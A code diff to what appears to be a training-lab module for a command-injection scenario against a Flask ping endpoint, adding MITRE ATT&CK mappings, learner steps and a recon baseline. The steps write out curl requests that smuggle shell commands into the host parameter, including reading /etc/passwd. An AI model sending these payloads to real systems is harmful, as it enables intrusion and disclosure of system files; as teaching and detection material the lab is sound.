@@ -35,6 +35,15 @@ class CmdInjectionModule(BaseModule):
     category = Category.INJECTION
     scenario_id = "APP-02"
     severity = Severity.CRITICAL
+    # MITRE ATT&CK — exploit the public app to run shell commands as the web user.
+    mitre = {
+        "tactics": ["TA0001 Initial Access", "TA0002 Execution", "TA0007 Discovery"],
+        "techniques": [
+            {"id": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
+            {"id": "T1059.004", "name": "Command and Scripting Interpreter: Unix Shell", "tactic": "Execution"},
+            {"id": "T1033", "name": "System Owner/User Discovery", "tactic": "Discovery"},
+        ],
+    }
     lab = {
         "target_path": "/system/ping",
         "vulnerable_component": "Flask ping handler (system_bp.ping) — os.popen",
@@ -45,16 +54,26 @@ class CmdInjectionModule(BaseModule):
             "commands as the web-server user."
         ),
         "learner_steps": [
-            {"action": "Open the diagnostics page and run a normal ping to 127.0.0.1.",
-             "expected": "You see 'PING 127.0.0.1' followed by normal ping output."},
-            {"action": "Try entering 127.0.0.1;id in the host field.",
-             "expected": "After the ping you see 'uid=…' — the id command executed."},
-            {"action": "Try other separators: 127.0.0.1 && whoami or 127.0.0.1|cat /etc/hostname",
-             "expected": "System command output appears alongside ping output."},
-            {"action": "Try reading a sensitive file: 127.0.0.1;cat /etc/passwd",
-             "expected": "The contents of /etc/passwd are displayed."},
+            {"action": "Baseline the diagnostics feature with a clean host.",
+             "technique": "T1595.002 Active Scanning: Vulnerability Scanning",
+             "command": "curl -s 'http://target-agent/system/ping?host=127.0.0.1'",
+             "expected": "You see normal 'PING 127.0.0.1' output — establishing the expected behaviour."},
+            {"action": "Inject a command separator and run 'id'.",
+             "technique": "T1059.004 Command and Scripting Interpreter: Unix Shell",
+             "command": "curl -s -G http://target-agent/system/ping --data-urlencode 'host=127.0.0.1;id'",
+             "expected": "After the ping you see 'uid=…(www-data)…' — the id command executed."},
+            {"action": "Confirm the execution context (who am I, where am I).",
+             "technique": "T1033 System Owner/User Discovery",
+             "command": "curl -s -G http://target-agent/system/ping --data-urlencode 'host=127.0.0.1 && whoami && hostname'",
+             "expected": "The web-server user and hostname print after the ping output."},
+            {"action": "Read a sensitive file to show full impact.",
+             "technique": "T1059.004 Command and Scripting Interpreter: Unix Shell",
+             "command": "curl -s -G http://target-agent/system/ping --data-urlencode 'host=127.0.0.1;cat /etc/passwd'",
+             "expected": "The contents of /etc/passwd are displayed — arbitrary command execution confirmed."},
             {"action": "Check the Evidence panel for Wazuh detections.",
-             "expected": "Alert matches shell-metacharacter pattern in the host parameter."},
+             "technique": "T1059.004 Command and Scripting Interpreter: Unix Shell",
+             "command": "# review the activity log / Wazuh feed in ATTENSE",
+             "expected": "Alert matches the shell-metacharacter pattern in the host parameter."},
         ],
         "detection_rule": "Wazuh cmd-injection signature (shell metacharacters in host param)",
         "success_markers": [
@@ -64,7 +83,20 @@ class CmdInjectionModule(BaseModule):
         ],
         "quick_probe": "/system/ping?host=127.0.0.1;id",
     }
-    steps = [{'title': 'Probe /system/ping with benign host', 'hint': 'Baseline response for a clean 127.0.0.1 request', 'expected': 'HTTP 200 with ping output visible'}, {'title': 'Inject shell metacharacters', 'hint': 'Try separators ; | && $(…) against the host parameter', 'expected': 'Command output leaks back in the HTML response'}, {'title': 'Confirm RCE indicators', 'hint': "Match on 'uid=', 'root', 'www-data', '/bin/'", 'expected': 'Successful step flagged CRITICAL'}]
+    steps = [
+        {'title': 'Probe /system/ping with benign host', 'tactic': 'Reconnaissance',
+         'technique': 'T1595.002 Active Scanning: Vulnerability Scanning',
+         'command': "curl -s 'http://target-agent/system/ping?host=127.0.0.1'",
+         'hint': 'Baseline response for a clean 127.0.0.1 request', 'expected': 'HTTP 200 with ping output visible'},
+        {'title': 'Inject shell metacharacters', 'tactic': 'Execution',
+         'technique': 'T1059.004 Command and Scripting Interpreter: Unix Shell',
+         'command': "curl -s -G http://target-agent/system/ping --data-urlencode 'host=127.0.0.1;id'",
+         'hint': 'Try separators ; | && $(…) against the host parameter', 'expected': 'Command output leaks back in the HTML response'},
+        {'title': 'Confirm RCE indicators', 'tactic': 'Discovery',
+         'technique': 'T1033 System Owner/User Discovery',
+         'command': "curl -s -G http://target-agent/system/ping --data-urlencode 'host=127.0.0.1;cat /etc/passwd'",
+         'hint': "Match on 'uid=', 'root', 'www-data', '/bin/'", 'expected': 'Successful step flagged CRITICAL'},
+    ]
 
     def options(self) -> list[ModuleOption]:
         return [
@@ -92,6 +124,12 @@ class CmdInjectionModule(BaseModule):
         custom = opts.get("custom_cmd", "").strip()
         if custom:
             payloads.append(("custom", f"127.0.0.1;{custom}"))
+
+        # ── Recon (T1595.002): baseline benign ping before injecting ──
+        self._log(log_fn, "Recon: baseline ping to 127.0.0.1 (expected behaviour)...")
+        base = self._get(target.base_url + endpoint, params={"host": "127.0.0.1"},
+                         label="recon-baseline", timeout=target.timeout)
+        steps.append(base)
 
         self._log(log_fn, f"Testing {len(payloads)} command injection payloads against {endpoint}")
 
